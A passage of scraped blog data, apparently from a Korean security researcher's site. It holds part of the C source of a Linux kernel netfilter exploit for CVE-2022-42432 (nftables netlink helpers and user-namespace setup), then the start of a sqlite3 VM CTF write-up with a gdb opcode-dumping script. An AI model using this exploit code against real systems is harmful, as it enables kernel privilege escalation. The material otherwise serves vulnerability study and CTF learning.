NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool delete_chain(char * table_name, char * chain_name){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool create_rule(struct nftnl_rule * r) { struct mnl_socket *nl; struct nlmsghdr *nlh; struct mnl_nlmsg_batch *batch; char buf[MNL_SOCKET_BUFFER_SIZE]; uint32_t seq = time(NULL); int ret; nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY), NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++); nftnl_rule_nlmsg_build_payload(nlh, r); nftnl_rule_free(r); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)); if (ret == -1) { perror(\u0026#34;mnl_socket_sendto\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); if (ret == -1) { perror(\u0026#34;mnl_socket_recvfrom\u0026#34;); return false; } ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL); if (ret \u0026lt; 0) { perror(\u0026#34;mnl_cb_run\u0026#34;); return false; } mnl_socket_close(nl); return true; } static void add_meta(struct nftnl_rule *r, uint32_t key, uint32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;meta\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_META_KEY, key); nftnl_expr_set_u32(e, NFTNL_EXPR_META_DREG, dreg); nftnl_rule_add_expr(r, e); } static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op, const void *data, uint32_t data_len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;cmp\u0026#34;); if (e == NULL) { perror(\u0026#34;expr cmp oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg); nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op); nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len); nftnl_rule_add_expr(r, e); } static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t sreg, uint32_t dreg, uint32_t offset, uint32_t len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;payload\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base); if(sreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg); if(dreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len); nftnl_rule_add_expr(r, e); } int add_verdict(struct nftnl_rule *r, int verdict, char * chain, u_int32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;immediate\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); if(chain) nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain); nftnl_rule_add_expr(r, e); return 0; } void write_file(const char *filename, char *text) { int fd = open(filename, O_RDWR); write(fd, text, strlen(text)); close(fd); } void new_ns(void) { uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100]; if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) { perror(\u0026#34; [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)\u0026#34;); exit(EXIT_FAILURE); } if (unshare(CLONE_NEWNET)){ perror(\u0026#34; [-] unshare(CLONE_NEWNET)\u0026#34;); exit(EXIT_FAILURE); } write_file(\u0026#34;/proc/self/setgroups\u0026#34;, \u0026#34;deny\u0026#34;); snprintf(buffer, sizeof(buffer), \u0026#34;0 %d 1\u0026#34;, uid); write_file(\u0026#34;/proc/self/uid_map\u0026#34;, buffer); snprintf(buffer, sizeof(buffer), \u0026#34;0 %d 1\u0026#34;, gid); write_file(\u0026#34;/proc/self/gid_map\u0026#34;, buffer); } #ifndef HEXDUMP_COLS #define HEXDUMP_COLS 16 #endif void hexdump(void *mem, unsigned int len) { unsigned int i, j; for(i = 0; i \u0026lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf(\u0026#34;0x%06x: \u0026#34;, i); } /* print hex data */ if(i \u0026lt; len) { printf(\u0026#34;%02x \u0026#34;, 0xFF \u0026amp; ((char*)mem)[i]); } else /* end of block, just aligning for ASCII dump */ { printf(\u0026#34; \u0026#34;); } /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(j = i - (HEXDUMP_COLS - 1); j \u0026lt;= i; j++) { if(j \u0026gt;= len) /* end of block, not really printing */ { putchar(\u0026#39; \u0026#39;); } else if(isprint(((char*)mem)[j])) /* printable char */ { putchar(0xFF \u0026amp; ((char*)mem)[j]); } else /* other char */ { putchar(\u0026#39;.\u0026#39;); } } putchar(\u0026#39;\\n\u0026#39;); } } } https://youtu.be/p_VYklBtE4A Exploit\n","permalink":"https://msh1307.kr/blog/cve-2022-42432-linux-kernel-netfilter/","summary":"CVE-2022-42432 struct expr_ops expr_ops_osf = { .name\t= \u0026#34;osf\u0026#34;, .alloc_len\t= sizeof(struct nftnl_expr_osf), .max_attr\t= NFTA_OSF_MAX, .set\t= nftnl_expr_osf_set, .get\t= nftnl_expr_osf_get, .parse\t= nftnl_expr_osf_parse, .build\t= nftnl_expr_osf_build, .output\t= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.\nstruct nftnl_expr_osf { enum nft_registers\tdreg; uint8_t\tttl; uint32_t\tflags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(\u0026amp;osf-\u0026gt;dreg, data, sizeof(osf-\u0026gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(\u0026amp;osf-\u0026gt;ttl, data, sizeof(osf-\u0026gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(\u0026amp;osf-\u0026gt;flags, data, sizeof(osf-\u0026gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다.","title":"CVE-2022-42432 Linux kernel netfilter"},{"content":"DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.\nsequilitis SQL query를 만들고 실행시키는 프로그램이다.\nAnalysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.\nsqlite3 sqlite3의 vmcode들을 분석해야한다.\n/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement. */ int nBytes, /* Length of zSql in bytes. */ u32 prepFlags, /* Zero or more SQLITE_PREPARE_* flags */ Vdbe *pReprepare, /* VM being reprepared */ sqlite3_stmt **ppStmt, /* OUT: A pointer to the prepared statement */ const char **pzTail /* OUT: End of parsed string */ ); sqlite3_prepare_v3는 내부적으로 Vdbe 라는 vm 구조체를 초기화하면서 바이트 코드들을 점화한다. 이는 내부적으로 호출되는 함수의 선언부만 봐도 알 수 있다.\nstruct Vdbe { sqlite3 *db; /* The database connection that owns this statement */ Vdbe **ppVPrev,*pVNext; /* Linked list of VDBEs with the same Vdbe.db */ Parse *pParse; /* Parsing context used to create this Vdbe */ ynVar nVar; /* Number of entries in aVar[] */ int nMem; /* Number of memory locations currently allocated */ int nCursor; /* Number of slots in apCsr[] */ u32 cacheCtr; /* VdbeCursor row cache generation counter */ int pc; /* The program counter */ int rc; /* Value to return */ i64 nChange; /* Number of db changes made since last reset */ int iStatement; /* Statement number (or 0 if has no opened stmt) */ i64 iCurrentTime; /* Value of julianday(\u0026#39;now\u0026#39;) for this statement */ i64 nFkConstraint; /* Number of imm. FK constraints this VM */ i64 nStmtDefCons; /* Number of def. constraints when stmt started */ i64 nStmtDefImmCons; /* Number of def. imm constraints when stmt started */ Mem *aMem; /* The memory locations */ Mem **apArg; /* Arguments to currently executing user function */ VdbeCursor **apCsr; /* One element of this array for each open cursor */ Mem *aVar; /* Values for the OP_Variable opcode. */ /* When allocating a new Vdbe object, all of the fields below should be ** initialized to zero or NULL */ Op *aOp; /* Space to hold the virtual machine\u0026#39;s program */ int nOp; /* Number of instructions in the program */ int nOpAlloc; /* Slots allocated for aOp[] */ Mem *aColName; /* Column names to return */ Mem *pResultRow; /* Current output row */ char *zErrMsg; /* Error message written here */ VList *pVList; /* Name of variables */ #ifndef SQLITE_OMIT_TRACE i64 startTime; /* Time when query started - used for profiling */ #endif #ifdef SQLITE_DEBUG int rcApp; /* errcode set by sqlite3_result_error_code() */ u32 nWrite; /* Number of write operations that have occurred */ #endif u16 nResColumn; /* Number of columns in one row of the result set */ u16 nResAlloc; /* Column slots allocated to aColName[] */ u8 errorAction; /* Recovery action to do in case of an error */ u8 minWriteFileFormat; /* Minimum file format for writable database files */ u8 prepFlags; /* SQLITE_PREPARE_* flags */ 여기서 Op 구조체를 확인하면 다음과 같다.\nstruct VdbeOp { u8 opcode; /* What operation to perform */ signed char p4type; /* One of the P4_xxx constants for p4 */ u16 p5; /* Fifth parameter is an unsigned 16-bit integer */ int p1; /* First operand */ int p2; /* Second parameter (often the jump destination) */ int p3; /* The third parameter */ union p4union { /* fourth parameter */ int i; /* Integer value if p4type==P4_INT32 */ void *p; /* Generic pointer */ char *z; /* Pointer to data for string (char array) types */ i64 *pI64; /* Used when p4type is P4_INT64 */ double *pReal; /* Used when p4type is P4_REAL */ FuncDef *pFunc; /* Used when p4type is P4_FUNCDEF */ sqlite3_context *pCtx; /* Used when p4type is P4_FUNCCTX */ CollSeq *pColl; /* Used when p4type is P4_COLLSEQ */ Mem *pMem; /* Used when p4type is P4_MEM */ VTable *pVtab; /* Used when p4type is P4_VTAB */ KeyInfo *pKeyInfo; /* Used when p4type is P4_KEYINFO */ u32 *ai; /* Used when p4type is P4_INTARRAY */ SubProgram *pProgram; /* Used when p4type is P4_SUBPROGRAM */ Table *pTab; /* Used when p4type is P4_TABLE */ #ifdef SQLITE_ENABLE_CURSOR_HINTS Expr *pExpr; /* Used when p4type is P4_EXPR */ #endif } p4; #ifdef SQLITE_ENABLE_EXPLAIN_COMMENTS char *zComment; /* Comment to improve readability */ #endif #ifdef SQLITE_VDBE_COVERAGE u32 iSrcLine; /* Source-code line that generated this opcode ** with flags in the upper 8 bits */ #endif #if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE) u64 nExec; u64 nCycle; #endif }; typedef struct VdbeOp VdbeOp; 분석 속도를 높히기 위해서 앞서 분석한 내용을 토대로 Ops를 dump하는 스크립트를 작성했다.\ndump_ops.py v= \u0026#39;\u0026#39;\u0026#39;OP_Savepoint = 0# OP_AutoCommit = 1# OP_Transaction = 2# OP_Checkpoint = 3# OP_JournalMode = 4# OP_Vacuum = 5# OP_VFilter = 6# /* jump, synopsis: iplan=r[P3] zplan=\u0026#39;P4\u0026#39; */ OP_VUpdate = 7# /* synopsis: data=r[P3@P2] */ OP_Init = 8# /* jump, synopsis: Start at P2 */ OP_Goto = 9# /* jump */ OP_Gosub = 10# /* jump */ OP_InitCoroutine = 11# /* jump */ OP_Yield = 12# /* jump */ OP_MustBeInt = 13# /* jump */ OP_Jump = 14# /* jump */ OP_Once = 15# /* jump */ OP_If = 16# /* jump */ OP_IfNot = 17# /* jump */ OP_IsType = 18# /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */ OP_Not = 19# /* same as TK_NOT, synopsis: r[P2]= !r[P1] */ OP_IfNullRow = 20# /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */ OP_SeekLT = 21# /* jump, synopsis: key=r[P3@P4] */ OP_SeekLE = 22# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGE = 23# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGT = 24# /* jump, synopsis: key=r[P3@P4] */ OP_IfNotOpen = 25# /* jump, synopsis: if( !csr[P1] ) goto P2 */ OP_IfNoHope = 26# /* jump, synopsis: key=r[P3@P4] */ OP_NoConflict = 27# /* jump, synopsis: key=r[P3@P4] */ OP_NotFound = 28# /* jump, synopsis: key=r[P3@P4] */ OP_Found = 29# /* jump, synopsis: key=r[P3@P4] */ OP_SeekRowid = 30# /* jump, synopsis: intkey=r[P3] */ OP_NotExists = 31# /* jump, synopsis: intkey=r[P3] */ OP_Last = 32# /* jump */ OP_IfSmaller = 33# /* jump */ OP_SorterSort = 34# /* jump */ OP_Sort = 35# /* jump */ OP_Rewind = 36# /* jump */ OP_SorterNext = 37# /* jump */ OP_Prev = 38# /* jump */ OP_Next = 39# /* jump */ OP_IdxLE = 40# /* jump, synopsis: key=r[P3@P4] */ OP_IdxGT = 41# /* jump, synopsis: key=r[P3@P4] */ OP_IdxLT = 42# /* jump, synopsis: key=r[P3@P4] */ OP_Or = 43# /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */ OP_And = 44# /* same as TK_AND, synopsis: r[P3]=(r[P1] \u0026amp;\u0026amp; r[P2]) */ OP_IdxGE = 45# /* jump, synopsis: key=r[P3@P4] */ OP_RowSetRead = 46# /* jump, synopsis: r[P3]=rowset(P1) */ OP_RowSetTest = 47# /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */ OP_Program = 48# /* jump */ OP_FkIfZero = 49# /* jump, synopsis: if fkctr[P1]==0 goto P2 */ OP_IsNull = 50# /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */ OP_NotNull = 51# /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */ OP_Ne = 52# /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */ OP_Eq = 53# /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */ OP_Gt = 54# /* jump, same as TK_GT, synopsis: IF r[P3]\u0026gt;r[P1] */ OP_Le = 55# /* jump, same as TK_LE, synopsis: IF r[P3]\u0026lt;=r[P1] */ OP_Lt = 56# /* jump, same as TK_LT, synopsis: IF r[P3]\u0026lt;r[P1] */ OP_Ge = 57# /* jump, same as TK_GE, synopsis: IF r[P3]\u0026gt;=r[P1] */ OP_ElseEq = 58# /* jump, same as TK_ESCAPE */ OP_IfPos = 59# /* jump, synopsis: if r[P1]\u0026gt;0 then r[P1]-=P3, goto P2 */ OP_IfNotZero = 60# /* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */ OP_DecrJumpZero = 61# /* jump, synopsis: if (--r[P1])==0 goto P2 */ OP_IncrVacuum = 62# /* jump */ OP_VNext = 63# /* jump */ OP_Filter = 64# /* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */ OP_PureFunc = 65# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Function = 66# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Return = 67# OP_EndCoroutine = 68# OP_HaltIfNull = 69# /* synopsis: if r[P3]=null halt */ OP_Halt = 70# OP_Integer = 71# /* synopsis: r[P2]=P1 */ OP_Int64 = 72# /* synopsis: r[P2]=P4 */ OP_String = 73# /* synopsis: r[P2]=\u0026#39;P4\u0026#39; (len=P1) */ OP_BeginSubrtn = 74# /* synopsis: r[P2]=NULL */ OP_Null = 75# /* synopsis: r[P2..P3]=NULL */ OP_SoftNull = 76# /* synopsis: r[P1]=NULL */ OP_Blob = 77# /* synopsis: r[P2]=P4 (len=P1) */ OP_Variable = 78# /* synopsis: r[P2]=parameter(P1,P4) */ OP_Move = 79# /* synopsis: r[P2@P3]=r[P1@P3] */ OP_Copy = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1] */ OP_SCopy = 81# /* synopsis: r[P2]=r[P1] */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] */ OP_FkCheck = 83# OP_ResultRow = 84# /* synopsis: output=r[P1@P2] */ OP_CollSeq = 85# OP_AddImm = 86# /* synopsis: r[P1]=r[P1]+P2 */ OP_RealAffinity = 87# OP_Cast = 88# /* synopsis: affinity(r[P1]) */ OP_Permutation = 89# OP_Compare = 90# /* synopsis: r[P1@P3] \u0026lt;-\u0026gt; r[P2@P3] */ OP_IsTrue = 91# /* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */ OP_ZeroOrNull = 92# /* synopsis: r[P2] = 0 OR NULL */ OP_Offset = 93# /* synopsis: r[P3] = sqlite_offset(P1) */ OP_Column = 94# /* synopsis: r[P3]=PX cursor P1 column P2 */ OP_TypeCheck = 95# /* synopsis: typecheck(r[P1@P2]) */ OP_Affinity = 96# /* synopsis: affinity(r[P1@P2]) */ OP_MakeRecord = 97# /* synopsis: r[P3]=mkrec(r[P1@P2]) */ OP_Count = 98# /* synopsis: r[P2]=count() */ OP_ReadCookie = 99# OP_SetCookie =100# OP_ReopenIdx =101# /* synopsis: root=P2 iDb=P3 */ OP_BitAnd =102# /* same as TK_BITAND, synopsis: r[P3]=r[P1]\u0026amp;r[P2] */ OP_BitOr =103# /* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */ OP_ShiftLeft =104# /* same as TK_LSHIFT, synopsis: r[P3]=r[P2]\u0026lt;\u0026lt;r[P1] */ OP_ShiftRight =105# /* same as TK_RSHIFT, synopsis: r[P3]=r[P2]\u0026gt;\u0026gt;r[P1] */ OP_Add =106# /* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */ OP_Subtract =107# /* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */ OP_Multiply =108# /* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */ OP_Divide =109# /* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */ OP_Remainder =110# /* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */ OP_Concat =111# /* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */ OP_OpenRead =112# /* synopsis: root=P2 iDb=P3 */ OP_OpenWrite =113# /* synopsis: root=P2 iDb=P3 */ OP_BitNot =114# /* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */ OP_OpenDup =115# OP_OpenAutoindex =116# /* synopsis: nColumn=P2 */ OP_String8 =117# /* same as TK_STRING, synopsis: r[P2]=\u0026#39;P4\u0026#39; */ OP_OpenEphemeral =118# /* synopsis: nColumn=P2 */ OP_SorterOpen =119# OP_SequenceTest =120# /* synopsis: if( cursor[P1].ctr++ ) pc = P2 */ OP_OpenPseudo =121# /* synopsis: P3 columns in r[P2] */ OP_Close =122# OP_ColumnsUsed =123# OP_SeekScan =124# /* synopsis: Scan-ahead up to P1 rows */ OP_SeekHit =125# /* synopsis: set P2\u0026lt;=seekHit\u0026lt;=P3 */ OP_Sequence =126# /* synopsis: r[P2]=cursor[P1].ctr++ */ OP_NewRowid =127# /* synopsis: r[P2]=rowid */ OP_Insert =128# /* synopsis: intkey=r[P3] data=r[P2] */ OP_RowCell =129# OP_Delete =130# OP_ResetCount =131# OP_SorterCompare =132# /* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */ OP_SorterData =133# /* synopsis: r[P2]=data */ OP_RowData =134# /* synopsis: r[P2]=data */ OP_Rowid =135# /* synopsis: r[P2]=PX rowid of P1 */ OP_NullRow =136# OP_SeekEnd =137# OP_IdxInsert =138# /* synopsis: key=r[P2] */ OP_SorterInsert =139# /* synopsis: key=r[P2] */ OP_IdxDelete =140# /* synopsis: key=r[P2@P3] */ OP_DeferredSeek =141# /* synopsis: Move P3 to P1.rowid if needed */ OP_IdxRowid =142# /* synopsis: r[P2]=rowid */ OP_FinishSeek =143# OP_Destroy =144# OP_Clear =145# OP_ResetSorter =146# OP_CreateBtree =147# /* synopsis: r[P2]=root iDb=P1 flags=P3 */ OP_SqlExec =148# OP_ParseSchema =149# OP_LoadAnalysis =150# OP_DropTable =151# OP_DropIndex =152# OP_Real =153# /* same as TK_FLOAT, synopsis: r[P2]=P4 */ OP_DropTrigger =154# OP_IntegrityCk =155# OP_RowSetAdd =156# /* synopsis: rowset(P1)=r[P2] */ OP_Param =157# OP_FkCounter =158# /* synopsis: fkctr[P1]+=P2 */ OP_MemMax =159# /* synopsis: r[P1]=max(r[P1],r[P2]) */ OP_OffsetLimit =160# /* synopsis: if r[P1]\u0026gt;0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */ OP_AggInverse =161# /* synopsis: accum=r[P3] inverse(r[P2@P5]) */ OP_AggStep =162# /* synopsis: accum=r[P3] step(r[P2@P5]) */ OP_AggStep1 =163# /* synopsis: accum=r[P3] step(r[P2@P5]) */ OP_AggValue =164# /* synopsis: r[P3]=value N=P2 */ OP_AggFinal =165# /* synopsis: accum=r[P1] N=P2 */ OP_Expire =166# OP_CursorLock =167# OP_CursorUnlock =168# OP_TableLock =169# /* synopsis: iDb=P1 root=P2 write=P3 */ OP_VBegin =170# OP_VCreate =171# OP_VDestroy =172# OP_VOpen =173# OP_VCheck =174# OP_VInitIn =175# /* synopsis: r[P2]=ValueList(P1,P3) */ OP_VColumn =176# /* synopsis: r[P3]=vcolumn(P2) */ OP_VRename =177# OP_Pagecount =178# OP_MaxPgcnt =179# OP_ClrSubtype =180# /* synopsis: r[P1].subtype = 0 */ OP_FilterAdd =181# /* synopsis: filter(P1) += key(P3@P4) */ OP_Trace =182# OP_CursorHint =183# OP_ReleaseReg =184# /* synopsis: release r[P1@P2] mask P3 */ OP_Noop =185# OP_Explain =186# OP_Abortable =187# \u0026#39;\u0026#39;\u0026#39; import gdb import struct opcode = {} for i,j in enumerate(v.split(\u0026#39;\\n\u0026#39;)): opcode[i] = j.split()[0] if i == 187: break gdb.execute(\u0026#39;brva 0x88E1\u0026#39;) gdb.execute(\u0026#39;c\u0026#39;) rdi = (gdb.parse_and_eval(\u0026#39;*(int64_t *)($rdi+0x88)\u0026#39;)) inf = gdb.selected_inferior() while True: mem = bytes(inf.read_memory(rdi, 0x18)) p4_type = mem[1] p5 = struct.unpack(\u0026#39;\u0026lt;H\u0026#39;,mem[2:4])[0] p1 = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;,mem[4:8])[0] p2 = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;,mem[8:12])[0] p3 = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;,mem[12:16])[0] p4 = struct.unpack(\u0026#39;\u0026lt;Q\u0026#39;,mem[16:24])[0] print(\u0026#34;{\u0026#34;) print(\u0026#39;\\tOPCODE =\u0026#39;,opcode[mem[0]]) print(\u0026#39;\\tp5 =\u0026#39;,p5) print(\u0026#39;\\tp4_type =\u0026#39;,p4_type) print(\u0026#39;\\tp4 =\u0026#39;,hex(p4)) print(\u0026#39;\\tp1 =\u0026#39;,hex(p1)) print(\u0026#39;\\tp2 =\u0026#39;,hex(p2)) print(\u0026#39;\\tp3 =\u0026#39;,hex(p3)) print(\u0026#34;}\u0026#34;) rdi += 0x18 if mem[0] == 70: break 위 스크립트를 이용해서 몇가지 SQL에 대한 바이트 코드가 어떻게 점화되는지 확인했다.\nSELECT 0x1234 gef\u0026gt; source dump_ops.py { OPCODE = OP_Init p5 = 0 p4_type = 0 p4 = 0x0 p1 = 0x0 p2 = 0x4 p3 = 0x0 } { OPCODE = OP_Integer p5 = 0 p4_type = 0 p4 = 0x0 p1 = 0x1244566 p2 = 0x1 p3 = 0x0 } { OPCODE = OP_ResultRow p5 = 0 p4_type = 0 p4 = 0x0 p1 = 0x1 p2 = 0x1 p3 = 0x0 } { OPCODE = OP_Halt p5 = 0 p4_type = 0 p4 = 0x0 p1 = 0x0 p2 = 0x0 p3 = 0x0 } OP_Init은 초기화 작업을 해주고 p2에 저장된 entrypoint로 뛰어주는 역할을 한다. 그리고 OP_ResultRow로 ResultRow를 지정한다. 마지막으로 OP_Halt로 vm 프로그램을 종료한다.\n이러한 바이트 코드들은 sqlite3_step 내부에서 실행된다. 최종적으로 sqlite3VdbeExec이 호출된다.\nSQLITE_PRIVATE int sqlite3VdbeExec( Vdbe *p /* The VDBE */ ){ Op *aOp = p-\u0026gt;aOp; /* Copy of p-\u0026gt;aOp */ Op *pOp = aOp; /* Current operation */ #ifdef SQLITE_DEBUG Op *pOrigOp; /* Value of pOp at the top of the loop */ int nExtraDelete = 0; /* Verifies FORDELETE and AUXDELETE flags */ u8 iCompareIsInit = 0; /* iCompare is initialized */ #endif int rc = SQLITE_OK; /* Value to return */ sqlite3 *db = p-\u0026gt;db; /* The database */ u8 resetSchemaOnFault = 0; /* Reset schema after an error if positive */ u8 encoding = ENC(db); /* The database encoding */ int iCompare = 0; /* Result of last comparison */ u64 nVmStep = 0; /* Number of virtual machine steps */ #ifndef SQLITE_OMIT_PROGRESS_CALLBACK u64 nProgressLimit; /* Invoke xProgress() when nVmStep reaches this */ #endif Mem *aMem = p-\u0026gt;aMem; /* Copy of p-\u0026gt;aMem */ Mem *pIn1 = 0; /* 1st input operand */ Mem *pIn2 = 0; /* 2nd input operand */ Mem *pIn3 = 0; /* 3rd input operand */ Mem *pOut = 0; /* Output operand */ u32 colCacheCtr = 0; /* Column cache counter */ #if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE) u64 *pnCycle = 0; int bStmtScanStatus = IS_STMT_SCANSTATUS(db)!=0; #endif /*** INSERT STACK UNION HERE ***/ assert( 